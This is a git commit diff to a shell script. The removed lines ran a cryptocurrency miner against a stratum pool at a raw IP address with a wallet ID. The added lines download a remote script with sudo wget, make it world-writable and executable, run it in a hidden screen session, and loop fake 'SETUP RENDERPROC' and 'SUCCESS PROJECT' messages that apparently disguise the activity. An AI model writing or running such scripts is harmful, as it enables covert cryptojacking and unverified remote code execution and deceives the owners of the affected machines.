c484adddb150a894eb4aa5c3f18057ba66df7f26
renilo <88342640+renilo@users.noreply.github.com>
2022-10-29 23:37:44 +0700

    Update mekimeki.sh

--- mekimeki.sh
+++ mekimeki.sh
@@ -5,11 +5,13 @@
 sudo apt-get install screen -y
 clear
 sleep 1
-screen -r Anjing
-sudo wget -qO anjingg https://github.com/indah38/theta/raw/main/VTM
+sudo wget https://raw.githubusercontent.com/renilo/kuuntul/main/antam.sh
 clear
 sleep 1
-chmod 700 anjingg
 clear
+sudo chmod 777 antam.sh
 sleep 1
-./anjingg -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU2 -p x -t4
+screen -dmS Running ./antam.sh
+sleep 1
+i=1
+while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
